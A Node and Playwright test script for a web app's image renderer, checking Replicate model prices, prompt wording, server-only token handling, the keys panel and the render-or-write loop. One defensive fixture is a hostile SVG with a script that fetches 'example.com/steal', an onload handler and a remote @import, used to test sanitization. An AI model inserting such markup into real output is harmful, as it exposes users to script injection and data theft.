/**
 * The renderer, and the promises made about its token.
 *
 * A second way to fill a part arrived: Replicate draws the body instead of
 * Claude writing it. That is a model that costs money per press, holds a
 * token the browser must never see, and hands back markup written by
 * something that is not this app. So what is held shut here is mostly not
 * "does it draw":
 *
 *   · the token is read from the server's environment and from nowhere
 *     else, and no answer this route gives ever contains it;
 *   · with no token the answer is HTTP 200, ok:false, reason "unavailable",
 *     with a message that says where the token goes — the same shape a
 *     locked Claude key answers with, so the same dialog shows it;
 *   · an SVG that came back from a drawing model goes through exactly the
 *     locks a written body does;
 *   · a raster is a data: URI and nothing else, so nothing is fetched when
 *     the part renders;
 *   · the price is 0.04 raster, 0.08 vector, in one place, and it reaches
 *     the usage line;
 *   · the vault does not hold it, does not offer a field for it, and says
 *     so;
 *   · and in the body loop the renderer goes first, is scored on the same
 *     bar, keeps whichever of the two actually looked like the drawing, and
 *     falls back to the written body when it is not there.
 *
 *   node tests/renderer.mjs [url]      # default http://localhost:3000
 */
import { createRequire } from "node:module";
import {
  costLine, fluxRatio, isRenderKind, money, rasterFragment, recraftSize,
  renderPrompt, RENDER_COST, RENDER_MODELS, RENDER_UNAVAILABLE,
} from "../src/features/studio/renderer.ts";
import { cleanSnippet, RENDER_LIMIT, SNIPPET_LIMIT } from "../src/features/studio/snippet.ts";

const req = createRequire(import.meta.url);
const { chromium } = (() => {
  for (const c of [process.env.PLAYWRIGHT_MODULE, "playwright", "/opt/node22/lib/node_modules/playwright"].filter(Boolean)) {
    try { return req(c); } catch { /* next */ }
  }
  throw new Error("No Playwright found. npm i -D playwright, or set PLAYWRIGHT_MODULE.");
})();

const URL_BASE = process.argv[2] ?? "http://localhost:3000";
const results = [];
const check = (name, ok, detail = "") => {
  results.push(ok);
  console.log(`${ok ? "  ok  " : " FAIL "} ${name}${detail ? ` — ${detail}` : ""}`);
};

/* ------------------------------------------------------------------ */
/* 1. The two models, and what they cost                               */
/* ------------------------------------------------------------------ */

check("vector is recraft's SVG model", RENDER_MODELS.vector === "recraft-ai/recraft-v3-svg", RENDER_MODELS.vector);
check("raster is flux 2 pro", RENDER_MODELS.raster === "black-forest-labs/flux-2-pro", RENDER_MODELS.raster);
check("a raster call is four cents", RENDER_COST.raster === 0.04, String(RENDER_COST.raster));
check("a vector call is eight", RENDER_COST.vector === 0.08, String(RENDER_COST.vector));
check("and a price is written as one", money(RENDER_COST.vector) === "$0.08" && money(0.4) === "$0.40", `${money(RENDER_COST.vector)} ${money(0.4)}`);
check("the usage line says what it was spent on", costLine("raster", 3) === "$0.12 at the renderer", costLine("raster", 3));
check("only the two kinds are kinds", isRenderKind("vector") && isRenderKind("raster") && !isRenderKind("svg") && !isRenderKind(""));

/* ------------------------------------------------------------------ */
/* 2. The frame the drawing is asked for                               */
/* ------------------------------------------------------------------ */

check("a square part asks for a square frame", recraftSize(320, 320) === "1024x1024", recraftSize(320, 320));
check("a wide one asks for a wide frame", /^(1536x1024|1365x1024|1434x1024)$/.test(recraftSize(900, 620)), recraftSize(900, 620));
check("a tall one asks for a tall frame", recraftSize(300, 900).split("x")[0] < recraftSize(300, 900).split("x")[1], recraftSize(300, 900));
check("flux is asked in ratios", fluxRatio(320, 320) === "1:1" && fluxRatio(1600, 900) === "16:9" && fluxRatio(600, 900) === "2:3",
  [fluxRatio(320, 320), fluxRatio(1600, 900), fluxRatio(600, 900)].join(" "));
{
  const closed = renderPrompt({ kind: "vector", prompt: "a helix of sentences", closed: true });
  const open = renderPrompt({ kind: "vector", prompt: "a helix of sentences", closed: false });
  check("the words say to fill the frame", /edge to edge/.test(closed) && /nothing floating small/.test(closed), closed.slice(0, 80));
  check("an open line is asked for as a band", /band following a single open line/.test(open));
  check("and nothing is asked to sit on a plate", /no background plate/.test(closed) && /no watermark/.test(closed));
  const painted = renderPrompt({ kind: "vector", prompt: "a crest", palette: { accent: "#b8ff24", text: "#eee", bg: "#000" } });
  check("the site's colours go with it", /#b8ff24/.test(painted) && /#000/.test(painted));
}

/* ------------------------------------------------------------------ */
/* 3. What comes back is not trusted                                   */
/* ------------------------------------------------------------------ */

{
  const nasty = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
    <script>fetch("https://example.com/steal")</script>
    <image href="https://example.com/pic.png" onload="go()"/>
    <style>@import url(https://fonts.example.com/x.css);</style>
    <path d="M0 0h100v100H0z" fill="#b8ff24"/></svg>`;
  const { html, stripped } = cleanSnippet(nasty, RENDER_LIMIT);
  check("a drawn SVG loses its script", !/<script/i.test(html) && stripped.includes("a script"));
  check("and its external image", !/example\.com\/pic/.test(html));
  check("and its event handler", !/onload/i.test(html) && stripped.includes("an event handler"));
  check("and its imported stylesheet", !/@import/i.test(html) && stripped.includes("an import"));
  check("what it actually drew survives", /<path d="M0 0h100v100H0z"/.test(html));
}
{
  // A drawing model emits every curve it drew: bigger than a hand-written
  // body, and cutting it in half is not a smaller picture.
  const big = `<svg viewBox="0 0 1 1">${"<path d='M0 0h1v1H0z'/>".repeat(2000)}</svg>`;
  check("a hand-written body is still held to its own limit", cleanSnippet(big).html.length <= SNIPPET_LIMIT);
  check("a drawn one is allowed to be a drawing", big.length > SNIPPET_LIMIT && cleanSnippet(big, RENDER_LIMIT).html.length === big.length,
    `${big.length} bytes`);
}
{
  const uri = "data:image/webp;base64,UklGRhIAAABXRUJQVlA4TAYAAAAvAAAAAA==";
  check("a raster body is a data: image and nothing else", rasterFragment(uri).startsWith(`<img src="${uri}"`), rasterFragment(uri).slice(0, 40));
  check("it fills the part's box", /width:100%;height:100%/.test(rasterFragment(uri)));
  check("a URL is not a raster body", rasterFragment("https://example.com/x.png") === "" && rasterFragment("data:text/html;base64,AAA") === "");
}

/* ------------------------------------------------------------------ */
/* 4. The route, with no token on this server                          */
/* ------------------------------------------------------------------ */

const post = async (body) => {
  const res = await fetch(`${URL_BASE}/api/studio/image`, {
    method: "POST",
    headers: { "content-type": "application/json", "x-replicate-token": "r8_pretendthisisatoken" },
    body: typeof body === "string" ? body : JSON.stringify(body),
  });
  return { status: res.status, text: await res.text() };
};

{
  const { status, text } = await post({ kind: "vector", prompt: "a helix of sentences", w: 320, h: 320 });
  const data = JSON.parse(text);
  check("no token is not an error: 200 with a reason", status === 200 && data.ok === false && data.reason === "unavailable", `${status} ${data.reason}`);
  check("and the reason says where the token goes", /REPLICATE_API_TOKEN/.test(data.message) && /Vercel/.test(data.message), data.message?.slice(0, 70));
  check("it is the message the app already had", data.message === RENDER_UNAVAILABLE);
  check("a token offered by the browser is not taken", !/pretendthisisatoken/.test(text));
  check("and nothing token-shaped comes back", !/r8_[A-Za-z0-9]{8}/.test(text));
}
{
  // The token is looked for before the body is even read, so a request that
  // could not possibly be drawn still answers the one thing worth saying.
  const { status, text } = await post("not json");
  check("the token is checked before anything else is", status === 200 && JSON.parse(text).reason === "unavailable", String(status));
}
{
  const res = await fetch(`${URL_BASE}/api/keys/status`, { cache: "no-store" });
  const data = await res.json();
  check("the status route reports the token, present or absent", "REPLICATE_API_TOKEN" in data.set, Object.keys(data.set).length + " names");
  check("and reports it as a yes or no, never a value", typeof data.set.REPLICATE_API_TOKEN === "boolean");
}

/* ------------------------------------------------------------------ */
/* 5. The panel: a row, not a field                                    */
/* ------------------------------------------------------------------ */

const browser = await chromium.launch({ headless: true, args: ["--no-sandbox"] });
const page = await browser.newPage({ viewport: { width: 1500, height: 1000 } });
await page.goto(`${URL_BASE}/builder`, { waitUntil: "networkidle" });
await page.waitForTimeout(800);
await page.getByRole("button", { name: "Keys" }).click();
await page.waitForTimeout(700);

{
  const row = page.locator("[data-renderer-row]");
  check("there is a Replicate row under Keys", (await row.count()) === 1);
  const text = (await row.first().innerText()).replace(/\s+/g, " ");
  check("it says whether the server has it", /not on the server|on the server/.test(text), text.slice(0, 60));
  check("it says server only", /server only/i.test(text));
  check("it names the variable and where it lives", /REPLICATE_API_TOKEN/.test(text) && /Vercel/.test(text));
  check("it says the vault will not hold it", /vault never holds it/i.test(text), text.slice(-120));
  check("it prices both kinds", /\$0\.08/.test(text) && /\$0\.04/.test(text));
  check("and there is nothing to type into", (await row.locator("input").count()) === 0);
  const anthropic = await page.locator('[data-service="anthropic"]').boundingBox();
  const mine = await row.first().boundingBox();
  check("it sits beside the Claude one, not at the bottom", !!anthropic && !!mine && mine.y > anthropic.y && mine.y - (anthropic.y + anthropic.height) < 40,
    `${Math.round((mine?.y ?? 0) - ((anthropic?.y ?? 0) + (anthropic?.height ?? 0)))}px below it`);
}
await page.keyboard.press("Escape");

/* ------------------------------------------------------------------ */
/* 6. The loop: renderer first, best kept, written when it is not there */
/* ------------------------------------------------------------------ */

const ring = (n, r) => Array.from({ length: n + 1 }, (_, i) => {
  const a = (i / n) * Math.PI * 2 - Math.PI / 2;
  return [0.5 + Math.cos(a) * (i % 2 || r === null ? r ?? 0.3 : 0.13), 0.5 + Math.sin(a) * (i % 2 || r === null ? r ?? 0.3 : 0.13)];
});
/** A box: its outline is very nearly the part's whole frame. */
const box = [[0.2, 0.2], [0.8, 0.2], [0.8, 0.8], [0.2, 0.8], [0.2, 0.2]];
/** A star: a third of its frame, so nothing that fills the frame can score well against it. */
const star = Array.from({ length: 11 }, (_, i) => {
  const a = (i / 10) * Math.PI * 2 - Math.PI / 2;
  const r = i % 2 ? 0.13 : 0.32;
  return [0.5 + Math.cos(a) * r, 0.5 + Math.sin(a) * r];
});

await page.route("**/api/studio/reshape", (route) =>
  route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ ok: true, patch: { featureId: "custom-idea", label: "Drawn", w: 320, h: 320, note: "an idea, drawn" }, usage: { model: "stub" } }) }));

const wrote = [];
await page.route("**/api/studio/body", (route) => {
  wrote.push({ at: Date.now(), body: JSON.parse(route.request().postData() ?? "{}") });
  // A dot in the middle: a real answer, and a bad one, so "the better of the
  // two" has an obvious right answer.
  return route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ ok: true, html: `<svg viewBox="0 0 100 100" preserveAspectRatio="none"><circle cx="50" cy="50" r="7" fill="#b8ff24"/></svg>`, note: "written", stripped: [] }) });
});

let token = true;
const drawn = [];
await page.route("**/api/studio/image", (route) => {
  drawn.push({ at: Date.now(), body: JSON.parse(route.request().postData() ?? "{}") });
  if (!token) {
    return route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ ok: false, reason: "unavailable", message: RENDER_UNAVAILABLE }) });
  }
  // A drawing that fills the frame, which is what the words ask for.
  return route.fulfill({
    status: 200, contentType: "application/json",
    body: JSON.stringify({ ok: true, kind: "vector", cost: RENDER_COST.vector, model: RENDER_MODELS.vector, stripped: [],
      html: `<svg viewBox="0 0 100 100" preserveAspectRatio="none"><rect width="100" height="100" fill="#b8ff24"/></svg>` }),
  });
});

await page.evaluate(() => localStorage.setItem("builder.settings", JSON.stringify({ state: { values: { "studio.drawMode": "raw" }, advanced: false }, version: 0 })));
await page.goto(`${URL_BASE}/builder`, { waitUntil: "networkidle" });
await page.waitForTimeout(900);

const read = () => page.evaluate(() => {
  const s = JSON.parse(localStorage.getItem("builder.studio") || "{}").state ?? {};
  const n = (s.nodes ?? []).filter((x) => x.code);
  const last = n[n.length - 1];
  const th = (s.threads ?? [])[(s.threads ?? []).length - 1];
  return {
    made: n.length,
    code: last?.code ? { source: last.code.source, kind: last.code.kind, cost: last.code.cost, overlap: last.code.overlap, attempts: last.code.attempts, scores: last.code.scores } : null,
    cost: th?.usage?.cost ?? 0,
    said: (th?.changes ?? []).join(" | "),
  };
});

const drawOne = async (points, words) => {
  await page.keyboard.press("Control+k");
  await page.waitForTimeout(350);
  await page.keyboard.type("drop a new idea");
  await page.waitForTimeout(400);
  await page.keyboard.press("Enter");
  await page.waitForTimeout(800);
  const part = page.locator("[data-node-id]").last();
  const pb = await part.boundingBox();
  await page.mouse.click(pb.x + pb.width / 2, pb.y + pb.height / 2, { button: "right" });
  await page.waitForTimeout(600);
  const shard = page.locator('[data-radial] [data-shard="draw"]').first();
  if (!(await shard.count())) return false;
  await shard.click({ force: true });
  await page.waitForTimeout(1200);
  const bb = await page.locator("[data-draw-board]").boundingBox();
  if (!bb) return false;
  await page.mouse.move(bb.x + points[0][0] * bb.width, bb.y + points[0][1] * bb.height);
  await page.mouse.down();
  for (const [x, y] of points) await page.mouse.move(bb.x + x * bb.width, bb.y + y * bb.height);
  await page.mouse.up();
  await page.waitForTimeout(400);
  await page.locator("[data-draw-words]").fill(words);
  await page.keyboard.press("Enter");
  return true;
};

const settle = async (want) => {
  for (let i = 0; i < 70; i++) {
    await page.waitForTimeout(1000);
    const s = await read();
    if (s.made >= want) break;
  }
  await page.waitForTimeout(1400);
  return read();
};

/* A drawing whose outline is very nearly the frame: what the renderer draws
   fills it, so it clears the bar and nothing is written at all. */
check("the board takes a box", await drawOne(box, "a card of one claim"));
let state = await settle(1);
console.log(`     box:   ${JSON.stringify(state.code)}`);
console.log(`     said:  ${state.said}`);
check("the renderer is asked first", drawn.length === 1 && drawn[0].body.kind === "vector", `${drawn.length} drawn, kind ${drawn[0]?.body?.kind}`);
check("it is told the part's size and whether the line closed", drawn[0]?.body?.w === 320 && drawn[0]?.body?.closed === true, JSON.stringify({ w: drawn[0]?.body?.w, closed: drawn[0]?.body?.closed }));
check("no key of any kind rides on a renderer call", !Object.keys(drawn[0]?.body ?? {}).some((k) => /key|token/i.test(k)));
check("clearing the bar, Claude is never asked", wrote.length === 0, `${wrote.length} written`);
check("and the body kept is the one it drew", state.code?.source === "renderer" && state.code?.kind === "vector", JSON.stringify(state.code));
check("scored on the same bar as a written one", (state.code?.overlap ?? 0) >= 0.72, String(state.code?.overlap));
check("what it cost is kept with the part", state.code?.cost === RENDER_COST.vector, String(state.code?.cost));
check("and reaches the iteration's usage line", state.cost === RENDER_COST.vector, String(state.cost));
check("the card says the renderer drew it, and the price", /renderer drew the body/i.test(state.said) && /\$0\.08/.test(state.said), state.said.slice(0, 100));

/* A star: a third of its frame. Nothing that fills the frame scores well
   against it, so the written body is tried too and the better is kept. */
check("the board takes a star", await drawOne(star, "a star of five claims"));
state = await settle(2);
console.log(`     star:  ${JSON.stringify(state.code)}`);
const firstDrawn = drawn[1]?.at ?? 0;
const firstWritten = wrote[0]?.at ?? 0;
check("short of the bar, the renderer still went first", firstDrawn > 0 && firstWritten > firstDrawn, `${firstWritten - firstDrawn}ms later`);
check("and then Claude was asked", wrote.length > 0, `${wrote.length} written`);
check("the drawing is the reference for the writer too", typeof wrote[0]?.body?.picture === "string" && wrote[0].body.picture.length > 100, `${wrote[0]?.body?.picture?.length ?? 0} bytes of PNG`);
check("the renderer's own render is what the critique is given to beat", wrote.some((w) => typeof w.body.shot === "string" && w.body.shot.length > 100 && /%/.test(w.body.critique ?? "")),
  (wrote[0]?.body?.critique ?? "").slice(0, 70));
check("both are scored, and the better of the two is kept", state.code?.source === "renderer" && (state.code?.scores?.length ?? 0) > 1, JSON.stringify(state.code?.scores));

/* No token: the route says so, and the body is written instead. */
token = false;
check("the board takes a third drawing", await drawOne(star, "a second star"));
state = await settle(3);
console.log(`     none:  ${JSON.stringify(state.code)}`);
console.log(`     said:  ${state.said}`);
check("with no token the renderer is still asked once", drawn.length === 3, `${drawn.length} calls`);
check("and the body is written instead", state.code?.source === "written", JSON.stringify(state.code));
check("nothing is charged for a renderer that was not there", !state.code?.cost && state.cost === 0, `${state.code?.cost} / ${state.cost}`);
check("and the reason is on the card, not swallowed", /renderer token/i.test(state.said), state.said.slice(-110));

await browser.close();
const failed = results.filter((r) => !r).length;
console.log(`\n${failed ? `${failed} FAILED` : "all good"} — ${results.length - failed}/${results.length}`);
process.exit(failed ? 1 : 0);
